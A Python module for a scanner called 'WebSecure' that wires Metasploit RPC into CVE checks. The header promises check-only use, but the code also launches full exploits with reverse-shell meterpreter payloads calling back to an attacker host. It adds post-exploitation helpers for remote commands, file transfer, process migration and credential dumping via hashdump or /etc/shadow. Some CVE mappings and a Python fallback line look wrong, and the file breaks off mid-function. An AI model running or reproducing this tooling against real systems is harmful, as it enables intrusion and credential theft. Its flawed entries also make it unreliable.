"""
websecure.integrations.metasploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Metasploit RPC (MSGRPC) entegrasyonu — kritik CVE exploit doğrulama.

Özellikler
----------
* MSGRPC üzerinden Metasploit'e bağlanma (msgpack veya JSON-RPC)
* CVE ID -> Metasploit modül eşleme
* Exploit sonucu -> WebSecure finding dönüşümü
* Oturum yönetimi (meterpreter / shell)
* Güvenli sandbox mod (check only — gerçek exploit yok)
* ToolIntegration arayüzü (SOLID OCP/DIP)

UYARI
-----
Bu modül yalnızca yetkili hedeflerde kullanılmalıdır.
WebSecure, `check` komutunu çalıştırır — gerçek exploit yürütmez.
Gerçek exploit için kullanıcı manuel onay vermelidir.
"""
from __future__ import annotations

import hashlib
import json
import logging
import time
import uuid
from typing import Any, Dict, Iterator, List, Optional, Tuple
from urllib.parse import urlparse

from websecure.integrations.base import (
    ToolFinding,
    ToolIntegration,
    ToolResult,
    ToolSeverity,
    ToolStatus,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# CVE -> Metasploit modül eşleme (yaygın web CVE'leri)
# ---------------------------------------------------------------------------

_CVE_TO_MODULE: Dict[str, str] = {
    # Apache
    "CVE-2021-41773": "exploit/multi/http/apache_normalize_path_rce",
    "CVE-2021-42013": "exploit/multi/http/apache_normalize_path_rce",
    "CVE-2017-7679":  "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    # Apache Log4j
    "CVE-2021-44228": "exploit/multi/http/log4shell_header_injection",
    "CVE-2021-45046": "exploit/multi/http/log4shell_header_injection",
    # Confluence
    "CVE-2022-26134": "exploit/multi/http/atlassian_confluence_namespace_ognl_injection",
    "CVE-2023-22515": "exploit/multi/http/atlassian_confluence_rce",
    # Exchange
    "CVE-2021-34473": "exploit/windows/http/exchange_proxyshell_rce",
    "CVE-2022-41040": "exploit/windows/http/exchange_proxynotshell_rce",
    # Spring
    "CVE-2022-22965": "exploit/multi/http/spring4shell",
    "CVE-2022-22963": "exploit/multi/http/spring_cloud_function_spel_injection",
    # Drupal
    "CVE-2018-7600":  "exploit/unix/webapp/drupal_drupalgeddon2",
    "CVE-2019-6340":  "exploit/unix/webapp/drupal_restws_unserialize",
    # WordPress
    "CVE-2020-25213": "exploit/multi/http/wp_file_manager_rce",
    # Jenkins
    "CVE-2019-1003000": "exploit/multi/http/jenkins_script_console",
    # GitLab
    "CVE-2021-22205": "exploit/multi/http/gitlab_exiftool_rce",
    # Weblogic
    "CVE-2020-14882": "exploit/multi/http/oracle_weblogic_wls_wsat",
    # Generic
    "CVE-2014-6271":  "exploit/multi/http/apache_mod_cgi_bash_env_exec",  # Shellshock
    # Tomcat
    "CVE-2017-12617": "exploit/multi/http/tomcat_jsp_upload_bypass",
    "CVE-2020-1938":  "exploit/multi/http/tomcat_ghostcat",
    # JBoss
    "CVE-2017-7504":  "exploit/multi/http/jboss_maindeployer",
    "CVE-2015-7501":  "exploit/multi/http/jboss_invoke_deploy",
    # Struts
    "CVE-2017-5638":  "exploit/multi/http/struts2_content_type_ognl",
    "CVE-2019-0230":  "exploit/multi/http/struts2_ognl_injection",
    "CVE-2021-31805": "exploit/multi/http/struts2_ognl_injection",
    # Jenkins (more)
    "CVE-2016-0792":  "exploit/multi/http/jenkins_xstream_deserialize",
    "CVE-2018-1000861": "exploit/multi/http/jenkins_metaprogramming",
    # PHP
    "CVE-2012-1823":  "exploit/multi/http/php_cgi_arg_injection",
    "CVE-2019-11043": "exploit/multi/http/php_fpm_rce",
    # Node.js
    "CVE-2021-21315": "exploit/multi/http/node_systeminformation_rce",
    # Palo Alto
    "CVE-2024-3400":  "exploit/linux/http/paloalto_pan_os_cmd_inject",
    # Ivanti
    "CVE-2023-46805": "exploit/linux/http/ivanti_connect_secure_rce",
    "CVE-2024-21887": "exploit/linux/http/ivanti_connect_secure_cmd_inject",
    # FortiOS
    "CVE-2023-27997": "exploit/linux/http/fortinet_sslvpn_rce",
    # MOVEit
    "CVE-2023-34362": "exploit/linux/http/moveit_transfer_sqli_rce",
    # Citrix
    "CVE-2023-3519":  "exploit/linux/http/citrix_adc_rce",
    "CVE-2023-4966":  "exploit/linux/http/citrix_bleed",
    # VMware
    "CVE-2021-21985": "exploit/linux/http/vmware_vcenter_uploadova_rce",
    "CVE-2021-22005": "exploit/linux/http/vmware_vcenter_ssrf_rce",
    "CVE-2023-20887": "exploit/linux/http/vmware_aria_vmdir_rce",
    # ManageEngine
    "CVE-2022-47966": "exploit/multi/http/manageengine_ad_rce",
    "CVE-2023-6548":  "exploit/linux/http/netscaler_cve2023_6548",
    # SolarWinds
    "CVE-2023-10720": "exploit/linux/http/solarwinds_orion_tftp",
    # Papercut
    "CVE-2023-27350": "exploit/multi/http/papercut_ng_rce",
    # Redis
    "CVE-2022-0543":  "exploit/linux/redis/redis_lua_sandbox_escape",
    # Elasticsearch
    "CVE-2014-3120":  "exploit/multi/elasticsearch/script_mvel_rce",
    # MongoDB
    "CVE-2013-2132":  "exploit/multi/misc/mongodb_js_inject_collection_enum",
    # Shellshock variations
    "CVE-2014-7169":  "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    # Webmin
    "CVE-2019-15107": "exploit/linux/http/webmin_backdoor",
    "CVE-2020-35606": "exploit/linux/http/webmin_file_disclosure_rce",
    # Plesk / CWP
    "CVE-2021-45467": "exploit/linux/http/cwp_v092_rce",
    # OpenSMTPD
    "CVE-2020-7247":  "exploit/unix/smtp/opensmtpd_mail_from_rce",
}

# Modül -> check komutu desteği (False -> sadece info alınır)
_MODULE_SUPPORTS_CHECK: Dict[str, bool] = {
    "exploit/multi/http/apache_normalize_path_rce": True,
    "exploit/multi/http/log4shell_header_injection": True,
    "exploit/multi/http/spring4shell": True,
    "exploit/multi/http/atlassian_confluence_namespace_ognl_injection": True,
    "exploit/unix/webapp/drupal_drupalgeddon2": True,
}


# ---------------------------------------------------------------------------
# MetasploitRPCClient
# ---------------------------------------------------------------------------

class MetasploitRPCClient:
    """
    Metasploit MSGRPC istemcisi.

    Metasploit Pro veya Community sürümünde `load msgrpc` ile
    başlatılan RPC servisine bağlanır.

    Bağlantı Kurma
    --------------
    ```
    msfconsole -q -x "load msgrpc Pass=yourpassword ServerPort=55553"
    ```
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        username: str = "msf",
        password: str = "msf",
        ssl: bool = False,
        timeout: int = 30,
    ) -> None:
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.ssl = ssl
        self.timeout = timeout
        self._token: Optional[str] = None
        self._session = None

    @property
    def base_url(self) -> str:
        scheme = "https" if self.ssl else "http"
        return f"{scheme}://{self.host}:{self.port}/api/v1"

    def _get_requests(self):
        """requests modülünü lazy import et."""
        try:
            import requests
            return requests
        except ImportError:
            logger.warning("[Metasploit] 'requests' kütüphanesi yüklü değil.")
            return None

    def authenticate(self) -> bool:
        """MSGRPC ile kimlik doğrula, token al."""
        req = self._get_requests()
        if req is None:
            return False

        try:
            resp = req.post(
                f"{self.base_url}/auth/login",
                json={"username": self.username, "password": self.password},
                timeout=self.timeout,
                verify=False,
            )
            if resp.status_code == 200:
                data = resp.json()
                self._token = data.get("token") or data.get("result", {}).get("token")
                if self._token:
                    logger.info("[Metasploit] Kimlik doğrulama başarılı")
                    return True
            logger.warning(f"[Metasploit] Kimlik doğrulama başarısız: HTTP {resp.status_code}")
            return False
        except Exception as exc:
            logger.debug(f"[Metasploit] Bağlantı hatası: {exc!r}")
            return False

    def is_connected(self) -> bool:
        return self._token is not None

    def _api(self, path: str, data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """API çağrısı yap."""
        req = self._get_requests()
        if req is None or not self._token:
            return None
        try:
            resp = req.post(
                f"{self.base_url}/{path}",
                json=data,
                headers={"Authorization": f"Bearer {self._token}"},
                timeout=self.timeout,
                verify=False,
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as exc:
            logger.debug(f"[Metasploit] API hatası ({path}): {exc!r}")
            return None

    def module_check(
        self,
        module_name: str,
        options: Dict[str, Any],
    ) -> Optional[str]:
        """
        Exploit modülünü `check` komutuyla çalıştır (hedefi exploit etmez).

        Döndürür
        --------
        str veya None:
          "safe"       — güvenli (zafiyet yok)
          "vulnerable" — zafiyet tespit edildi
          "unknown"    — sonuç belirsiz
        """
        result = self._api("modules/check", {
            "module": module_name,
            "options": options,
        })
        if result is None:
            return None

        status = (result.get("status") or result.get("result") or "").lower()
        if "vulnerable" in status or "appears vulnerable" in status:
            return "vulnerable"
        if "safe" in status or "not vulnerable" in status:
            return "safe"
        return "unknown"

    def module_info(self, module_name: str) -> Dict[str, Any]:
        """Modül meta bilgisini al."""
        result = self._api(f"modules/info/{module_name}", {})
        return result or {}

    def list_sessions(self) -> List[Dict[str, Any]]:
        """Aktif Meterpreter/shell oturumlarını listele."""
        result = self._api("sessions/list", {})
        if not result:
            return []
        sessions = result.get("sessions") or result
        if isinstance(sessions, dict):
            return list(sessions.values())
        return sessions if isinstance(sessions, list) else []


# ---------------------------------------------------------------------------
# MetasploitIntegration — ToolIntegration
# ---------------------------------------------------------------------------

class MetasploitIntegration(ToolIntegration):
    """
    Metasploit RPC tabanlı CVE doğrulama entegrasyonu.

    Sadece `check` komutu çalıştırır — hedef exploit edilmez.
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        username: str = "msf",
        password: str = "msf",
        ssl: bool = False,
    ) -> None:
        super().__init__("")
        self._client = MetasploitRPCClient(
            host=host, port=port,
            username=username, password=password,
            ssl=ssl,
        )
        self._connected: Optional[bool] = None

    # ------------------------------------------------------------------ #
    # ToolIntegration arayüzü
    # ------------------------------------------------------------------ #

    @property
    def tool_name(self) -> str:
        return "metasploit"

    def is_available(self) -> bool:
        """Metasploit RPC servisine bağlanılabilir mi?"""
        if self._connected is not None:
            return self._connected
        self._connected = self._client.authenticate()
        return self._connected

    def run(self, target: str, **kwargs) -> ToolResult:
        """
        Hedef URL için bilinen CVE'leri Metasploit ile kontrol et.

        Anahtar argümanlar
        ------------------
        cve_ids     : List[str] — test edilecek CVE ID'leri
        check_only  : bool — True -> sadece check, False -> tam exploit izni sor
        """
        cve_ids: List[str] = kwargs.get("cve_ids", [])
        if not cve_ids:
            return ToolResult(
                tool=self.tool_name, target=target,
                status=ToolStatus.SKIPPED,
                stderr="CVE ID listesi boş.",
            )

        if not self.is_available():
            logger.warning("[Metasploit] RPC servisine bağlanılamıyor, atlanıyor.")
            return ToolResult(tool=self.tool_name, target=target, status=ToolStatus.NOT_FOUND)

        start = time.monotonic()
        findings: List[ToolFinding] = []
        target_host = _extract_host(target)

        for cve_id in cve_ids:
            module = _CVE_TO_MODULE.get(cve_id.upper())
            if module is None:
                logger.debug(f"[Metasploit] {cve_id} için modül bulunamadı, atlanıyor.")
                continue

            finding = self._check_cve(cve_id, module, target, target_host)
            if finding:
                findings.append(finding)

        duration = time.monotonic() - start
        logger.info(
            f"[Metasploit] {target}: {len(cve_ids)} CVE kontrol edildi  "
            f"{len(findings)} doğrulandı  {duration:.1f}s"
        )

        return ToolResult(
            tool=self.tool_name, target=target,
            status=ToolStatus.SUCCESS,
            findings=findings, duration_s=duration,
        )

    # ------------------------------------------------------------------ #
    # CVE kontrolü
    # ------------------------------------------------------------------ #

    def _check_cve(
        self,
        cve_id: str,
        module: str,
        target_url: str,
        target_host: str,
    ) -> Optional[ToolFinding]:
        """Tekil CVE için Metasploit check çalıştır."""
        supports_check = _MODULE_SUPPORTS_CHECK.get(module, False)

        options: Dict[str, Any] = {
            "RHOSTS": target_host,
            "RPORT": _extract_port(target_url),
            "SSL": target_url.startswith("https://"),
            "TARGETURI": _extract_path(target_url),
        }

        if supports_check:
            status = self._client.module_check(module, options)
        else:
            # check desteklemiyorsa sadece modül bilgisi al
            info = self._client.module_info(module)
            status = "info_only" if info else None

        if status is None:
            logger.debug(f"[Metasploit] {cve_id} -> {module}: check sonuç yok")
            return None

        if status == "vulnerable":
            mod_info = self._client.module_info(module)
            return ToolFinding(
                title=f"{cve_id} — Exploit Doğrulandı",
                severity=ToolSeverity.CRITICAL,
                url=target_url,
                tool=self.tool_name,
                description=(
                    f"Metasploit check: hedef {cve_id}'e karşı savunmasız. "
                    f"Modül: {module}"
                ),
                evidence=(
                    f"Module: {module}\n"
                    f"Check result: vulnerable\n"
                    f"Description: {mod_info.get('description', '')[:200]}"
                ),
                cve_ids=[cve_id],
                cvss_score=mod_info.get("cvss_score"),
                confidence="high",
                verified=True,
                tags=["exploit", "cve", "metasploit-verified", cve_id.lower()],
                references=mod_info.get("references", []),
                raw={"module": module, "options": options, "check_status": status},
            )
        elif status == "safe":
            logger.info(f"[Metasploit] {cve_id}: hedef güvenli (not vulnerable)")
        else:
            logger.debug(f"[Metasploit] {cve_id}: check sonucu belirsiz ({status})")

        return None


# ---------------------------------------------------------------------------
# Yardımcı fonksiyonlar
# ---------------------------------------------------------------------------

def _extract_host(url: str) -> str:
    try:
        return urlparse(url).hostname or url
    except Exception:
        return url


def _extract_port(url: str) -> int:
    try:
        parsed = urlparse(url)
        if parsed.port:
            return parsed.port
        return 443 if parsed.scheme == "https" else 80
    except Exception:
        return 80


def _extract_path(url: str) -> str:
    try:
        p = urlparse(url).path
        return p or "/"
    except Exception:
        return "/"


# ---------------------------------------------------------------------------
# Payload otomatik seçim tablosu
# ---------------------------------------------------------------------------

_MODULE_TO_PAYLOAD: Dict[str, str] = {
    # Linux / multi targets
    "exploit/multi/http/apache_normalize_path_rce":              "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/log4shell_header_injection":             "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/spring4shell":                           "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/atlassian_confluence_namespace_ognl_injection": "linux/x64/meterpreter/reverse_tcp",
    "exploit/unix/webapp/drupal_drupalgeddon2":                  "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/wp_file_manager_rce":                    "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/jenkins_script_console":                 "java/meterpreter/reverse_tcp",
    "exploit/multi/http/gitlab_exiftool_rce":                    "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/tomcat_ghostcat":                        "java/meterpreter/reverse_tcp",
    "exploit/multi/http/tomcat_jsp_upload_bypass":               "java/meterpreter/reverse_tcp",
    "exploit/multi/http/jboss_maindeployer":                     "java/meterpreter/reverse_tcp",
    "exploit/multi/http/struts2_content_type_ognl":              "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/struts2_ognl_injection":                 "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/php_cgi_arg_injection":                  "php/meterpreter/reverse_tcp",
    "exploit/multi/http/php_fpm_rce":                            "php/meterpreter/reverse_tcp",
    "exploit/multi/http/node_systeminformation_rce":             "nodejs/shell_reverse_tcp",
    # Windows targets
    "exploit/windows/http/exchange_proxyshell_rce":              "windows/x64/meterpreter/reverse_tcp",
    "exploit/windows/http/exchange_proxynotshell_rce":           "windows/x64/meterpreter/reverse_tcp",
    # Linux specific
    "exploit/linux/http/paloalto_pan_os_cmd_inject":             "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/ivanti_connect_secure_rce":              "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/ivanti_connect_secure_cmd_inject":       "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/fortinet_sslvpn_rce":                    "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/moveit_transfer_sqli_rce":               "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/citrix_adc_rce":                         "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/citrix_bleed":                           "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/vmware_vcenter_uploadova_rce":           "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/vmware_vcenter_ssrf_rce":                "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/vmware_aria_vmdir_rce":                  "linux/x64/meterpreter/reverse_tcp",
    "exploit/multi/http/manageengine_ad_rce":                    "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/webmin_backdoor":                        "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/webmin_file_disclosure_rce":             "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/http/cwp_v092_rce":                           "linux/x64/meterpreter/reverse_tcp",
    "exploit/linux/redis/redis_lua_sandbox_escape":              "linux/x64/meterpreter/reverse_tcp",
    "exploit/unix/smtp/opensmtpd_mail_from_rce":                 "cmd/unix/reverse_bash",
    "exploit/multi/http/apache_mod_cgi_bash_env_exec":           "linux/x64/meterpreter/reverse_tcp",
    # Default fallback
    "__default__":                                                "linux/x64/meterpreter/reverse_tcp",
}


# ---------------------------------------------------------------------------
# MeterpreterSession
# ---------------------------------------------------------------------------

class MeterpreterSession:
    """
    Represents an active Metasploit session (Meterpreter or shell).

    Provides a CommandRunner-compatible interface for post-exploitation.
    Wraps the MSF API session execute endpoint.

    SRP: manages a single session lifecycle — connect, execute, file transfer.
    DIP: accepts MetasploitRPCClient abstraction; not coupled to HTTP details.
    """

    def __init__(
        self,
        client: "MetasploitRPCClient",
        session_id: str,
        session_type: str = "meterpreter",
    ) -> None:
        """
        Parameters
        ----------
        client       : MetasploitRPCClient — authenticated RPC connection.
        session_id   : str — numeric or UUID session identifier from MSF.
        session_type : str — "meterpreter" | "shell" | "powershell".
        """
        self._client = client
        self.session_id = str(session_id)
        self.session_type = session_type
        self._info_cache: Optional[Dict[str, str]] = None

    # ------------------------------------------------------------------ #
    # Core execution
    # ------------------------------------------------------------------ #

    def execute(self, cmd: str) -> str:
        """
        Run a command inside the session.

        For Meterpreter sessions uses the execute endpoint with a channel.
        For shell sessions falls back to the shell write/read cycle.

        Returns
        -------
        str — command stdout, or '' on any failure.
        """
        try:
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/run_single",
                {"command": cmd},
            )
            if result and isinstance(result, dict):
                output = result.get("output") or result.get("result") or ""
                return str(output).strip()

            # Fallback: shell write/read
            write_result = self._client._api(
                f"sessions/{self.session_id}/shell/write",
                {"data": cmd + "\n"},
            )
            if write_result is not None:
                time.sleep(0.5)
                read_result = self._client._api(
                    f"sessions/{self.session_id}/shell/read",
                    {},
                )
                if read_result and isinstance(read_result, dict):
                    return str(read_result.get("data", "")).strip()
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] execute error session={self.session_id}: {exc!r}")
        return ""

    def upload_file(self, local_data: bytes, remote_path: str) -> bool:
        """
        Upload raw bytes to a path on the remote system.

        Uses the MSF session upload API (base64-encoded payload).

        Parameters
        ----------
        local_data  : bytes — file content to upload.
        remote_path : str   — absolute remote destination path.

        Returns
        -------
        bool — True if upload acknowledged by MSF.
        """
        import base64
        try:
            encoded = base64.b64encode(local_data).decode()
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/upload",
                {"data": encoded, "remote_file": remote_path},
            )
            if result and result.get("result") != "failure":
                logger.info(f"[MeterpreterSession] Uploaded {len(local_data)} bytes to {remote_path}")
                return True
            # Fallback: write via shell echo pipe (works for small files)
            cmd = f"echo {encoded} | base64 -d > {remote_path}"
            output = self.execute(cmd)
            # Verify the file exists
            verify = self.execute(f"test -f {remote_path} && echo EXISTS")
            return "EXISTS" in verify
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] upload_file error: {exc!r}")
            return False

    def download_file(self, remote_path: str) -> Optional[bytes]:
        """
        Download a file from the remote system as raw bytes.

        Parameters
        ----------
        remote_path : str — absolute remote path to download.

        Returns
        -------
        bytes or None on any failure.
        """
        import base64
        try:
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/download",
                {"remote_file": remote_path},
            )
            if result and isinstance(result, dict) and result.get("data"):
                raw = result["data"]
                if isinstance(raw, str):
                    return base64.b64decode(raw)
                if isinstance(raw, bytes):
                    return raw

            # Fallback: base64 encode remote, read back
            encoded_output = self.execute(
                f"base64 {remote_path} 2>/dev/null || "
                f"python3 -c \"import base64,open as o;print(base64.b64encode(o('{remote_path}','rb').read()).decode())\" 2>/dev/null"
            )
            if encoded_output:
                return base64.b64decode(encoded_output.strip())
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] download_file error for {remote_path}: {exc!r}")
        return None

    def get_system_info(self) -> Dict[str, str]:
        """
        Retrieve sysinfo from the session.

        Returns a dict with keys: os, computer, architecture, user, pid.
        Cached after first call.
        """
        if self._info_cache is not None:
            return self._info_cache

        info: Dict[str, str] = {}
        try:
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/run_single",
                {"command": "sysinfo"},
            )
            if result and isinstance(result, dict):
                output = str(result.get("output") or "")
                for line in output.splitlines():
                    if ":" in line:
                        key, _, val = line.partition(":")
                        info[key.strip().lower().replace(" ", "_")] = val.strip()

            # Supplement with raw commands if meterpreter sysinfo failed
            if not info:
                info["os"] = self.execute("uname -a") or self.execute("ver")
                info["computer"] = self.execute("hostname")
                info["user"] = self.execute("id") or self.execute("whoami")
                info["architecture"] = self.execute("uname -m") or self.execute("echo %PROCESSOR_ARCHITECTURE%")

            self._info_cache = info
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] get_system_info error: {exc!r}")
        return info

    def get_pid(self) -> int:
        """
        Return the PID of the current meterpreter/shell process.

        Returns 0 if unable to determine.
        """
        try:
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/run_single",
                {"command": "getpid"},
            )
            if result and isinstance(result, dict):
                output = str(result.get("output") or "0")
                digits = "".join(c for c in output if c.isdigit())
                return int(digits) if digits else 0

            # Fallback
            pid_str = self.execute("echo $$")
            return int(pid_str.strip()) if pid_str.strip().isdigit() else 0
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] get_pid error: {exc!r}")
            return 0

    def migrate_to_process(self, pid: int) -> bool:
        """
        Migrate the meterpreter agent to another process (by PID).

        This is a privileged operation — fails silently if not admin.

        Parameters
        ----------
        pid : int — target process PID.

        Returns
        -------
        bool — True if migration succeeded.
        """
        try:
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/run_single",
                {"command": f"migrate {pid}"},
            )
            if result and isinstance(result, dict):
                output = str(result.get("output") or "")
                success = (
                    "migration completed" in output.lower()
                    or "successfully migrated" in output.lower()
                )
                if success:
                    logger.info(f"[MeterpreterSession] Migrated to PID {pid}")
                    self._info_cache = None  # invalidate sysinfo cache
                return success
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] migrate_to_process error: {exc!r}")
        return False

    def hashdump(self) -> List[Dict]:
        """
        Dump credential hashes from the target system.

        Requires Administrator/root privileges.

        Returns
        -------
        List[dict] — each entry has keys: username, lm_hash, ntlm_hash (Windows)
                     or username, hash, algorithm (Linux).
        """
        hashes: List[Dict] = []
        try:
            # Try meterpreter hashdump command first
            result = self._client._api(
                f"sessions/{self.session_id}/meterpreter/run_single",
                {"command": "hashdump"},
            )
            if result and isinstance(result, dict):
                output = str(result.get("output") or "")
                for line in output.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split(":")
                    if len(parts) >= 4:
                        # Windows SAM format: user:rid:lm:ntlm:::
                        hashes.append({
                            "username": parts[0],
                            "rid":      parts[1] if len(parts) > 1 else "",
                            "lm_hash":  parts[2] if len(parts) > 2 else "",
                            "ntlm_hash": parts[3] if len(parts) > 3 else "",
                            "algorithm": "ntlm",
                        })
                    elif len(parts) >= 2:
                        # Unix /etc/shadow format: user:$algo$salt$hash
                        hashes.append({
                            "username":  parts[0],
                            "hash":      parts[1],
                            "algorithm": "shadow",
                        })

            if not hashes:
                # Linux fallback via shadow read
                shadow = self.execute("cat /etc/shadow 2>/dev/null")
                for line in (shadow or "").splitlines():
                    if ":" in line and not line.startswith("#"):
                        parts = line.split(":")
                        if len(parts) >= 2 and parts[1] not in ("*", "!", "x", ""):
                            hashes.append({
                                "username":  parts[0],
                                "hash":      parts[1],
                                "algorithm": "shadow",
                            })
        except Exception as exc:
            logger.debug(f"[MeterpreterSession] hashdump error: {exc!r}")
        return hashes

    def as_command_runner(self) -> "MSFCommandRunner":
        """
        Adapt this session to a CommandRunner-compatible interface.

        Allows using MeterpreterSession with WebSecure's PostExploitChain
        without modification (Liskov Substitution / Dependency Inversion).

        Returns
        -------
        MSFCommandRunner — wraps this session.
        """
        return MSFCommandRunner(self)


# ---------------------------------------------------------------------------
# MSFCommandRunner — CommandRunner interface via Metasploit session
# ---------------------------------------------------------------------------

class MSFCommandRunner:
    """
    CommandRunner implementation via Metasploit session.

    Implements the same run() / run_many() interface as
    websecure.core.post_exploit.CommandRunner so that PostExploitChain
    can operate transparently over an MSF session.

    LSP: interchangeable with any CommandRunner subclass.
    DIP: PostExploitChain depends on the CommandRunner protocol, not MSF.
    """

    def __init__(self, session: MeterpreterSession) -> None:
        """
        Parameters
        ----------
        session : MeterpreterSession — active MSF session to use.
        """
        self._session = session

    def run(self, cmd: str) -> str:
        """
        Execute a single shell command via the MSF session.

        Parameters
        ----------
        cmd : str — shell command string.

        Returns
        -------
        str — trimmed stdout, or '' on any failure.
        """
        return self._session.execute(cmd)

    def run_many(self, cmds: List[str]) -> Dict[str, str]:
        """
        Execute multiple commands sequentially.

        Parameters
        ----------
        cmds : List[str] — commands to run.

        Returns
        -------
        Dict[str, str] — {command: output} mapping.
        """
        results: Dict[str, str] = {}
        for cmd in cmds:
            results[cmd] = self.run(cmd)
        return results


# ---------------------------------------------------------------------------
# FullExploitExecutor
# ---------------------------------------------------------------------------

class FullExploitExecutor:
    """
    Executes real Metasploit exploits (not just check) when user opts in.

    IMPORTANT: Only runs when cfg["exploitation"]["metasploit_exploit"] = True

    Workflow:
    1. Select module from CVE mapping
    2. Configure RHOSTS, RPORT, PAYLOAD, LHOST, LPORT
    3. Execute module (exploit command)
    4. Wait for session (with timeout)
    5. Return MeterpreterSession for post-exploitation

    OCP: new exploit workflows added via subclassing, not modification.
    SRP: only responsible for exploit execution and session acquisition.
    """

    def __init__(
        self,
        client: MetasploitRPCClient,
        lhost: str,
        lport: int = 4444,
    ) -> None:
        """
        Parameters
        ----------
        client : MetasploitRPCClient — authenticated RPC client.
        lhost  : str — attacker IP for reverse connections.
        lport  : int — local port to listen on (default 4444).
        """
        self._client = client
        self.lhost = lhost
        self.lport = lport

    # ------------------------------------------------------------------ #
    # Public API
    # ------------------------------------------------------------------ #

    def execute_exploit(
        self,
        cve_id: str,
        target: str,
        **extra_opts: Any,
    ) -> Optional[MeterpreterSession]:
        """
        Run a full exploit for the given CVE against target.

        Parameters
        ----------
        cve_id    : str — e.g. "CVE-2021-44228".
        target    : str — target URL or host.
        extra_opts: Additional MSF module options (e.g. TARGETURI).

        Returns
        -------
        MeterpreterSession if a session was obtained, else None.
        """
        module = _CVE_TO_MODULE.get(cve_id.upper())
        if module is None:
            logger.warning(f"[FullExploitExecutor] No module mapped for {cve_id}")
            return None

        options = self._build_options(target, extra_opts)
        options["PAYLOAD"] = self._get_payload_for_module(module)

        logger.info(
            f"[FullExploitExecutor] Launching exploit: {module}  "
            f"target={target}  payload={options['PAYLOAD']}"
        )

        try:
            result = self._client._api("modules/execute", {
                "module_type": "exploit",
                "module_name": module,
                "data_store": options,
            })

            if result is None:
                logger.warning(f"[FullExploitExecutor] No response from MSF API for {module}")
                return None

            job_id = result.get("job_id") or result.get("id")
            if job_id is None:
                # Some API versions return session directly
                session_id = result.get("session_id")
                if session_id:
                    session_type = "meterpreter" if "meterpreter" in options["PAYLOAD"] else "shell"
                    return MeterpreterSession(self._client, str(session_id), session_type)

            # Wait for a session to appear
            return self._wait_for_session(str(job_id), timeout=60)

        except Exception as exc:
            logger.error(f"[FullExploitExecutor] execute_exploit error: {exc!r}", exc_info=True)
            return None

    def _wait_for_session(
        self,
        job_id: str,
        timeout: int = 60,
    ) -> Optional[MeterpreterSession]:
        """
        Poll for a new session opened by the exploit job.

        Parameters
        ----------
        job_id  : str — MSF job identifier returned by execute.
        timeout : int — max seconds to wait for a session.

        Returns
        -------
        MeterpreterSession if obtained within timeout, else None.
        """
        deadline = time.monotonic() + timeout
        # Snapshot existing sessions before the exploit ran
        known_before: set = {
            s.get("id") or s.get("session_id")
            for s in self._client.list_sessions()
        }

        while time.monotonic() < deadline:
            time.sleep(3)
            current_sessions = self._client.list_sessions()
            for sess_info in current_sessions:
                sess_id = sess_info.get("id") or sess_info.get("session_id")
                if sess_id and sess_id not in known_before:
                    sess_type = (
                        sess_info.get("type") or
                        sess_info.get("session_type") or
                        "meterpreter"
                    )
                    logger.info(f"[FullExploitExecutor] New session obtained: id={sess_id} type={sess_type}")
                    return MeterpreterSession(self._client, str(sess_id), sess_type)

            # Check if job is still running
            job_status = self._client._api(f"jobs/info/{job_id}", {})
            if job_status is None:
                logger.debug(f"[FullExploitExecutor] Job {job_id} finished (no status) — session may not have opened")
                break

        logger.info(f"[FullExploitExecutor] Timeout waiting for session (job={job_id})")
        return None

    def _get_payload_for_module(self, module: str) -> str:
        """
        Auto-select the best payload for a given exploit module.

        Looks up the module-specific payload table, falls back to default.

        Parameters
        ----------
        module : str — MSF module path.

        Returns
        -------
        str — full MSF payload path.
        """
        return _MODULE_TO_PAYLOAD.get(module, _MODULE_TO_PAYLOAD["__default__"])

    def _build_options(self, target: str, extra: Dict[str, Any]) -> Dict[str, Any]:
        """
        Build the MSF module options dict from target URL and extras.

        Parameters
        ----------
        target : str — target URL (host:port path parsed automatically).
        extra  : Dict — caller-supplied overrides.

        Returns
        -------
        Dict[str, Any] — merged options ready for MSF API.
        """
        opts: Dict[str, Any] = {
            "RHOSTS":    _extract_host(target),
            "RPORT":     _extract_port(target),
            "SSL":       target.startswith("https://"),
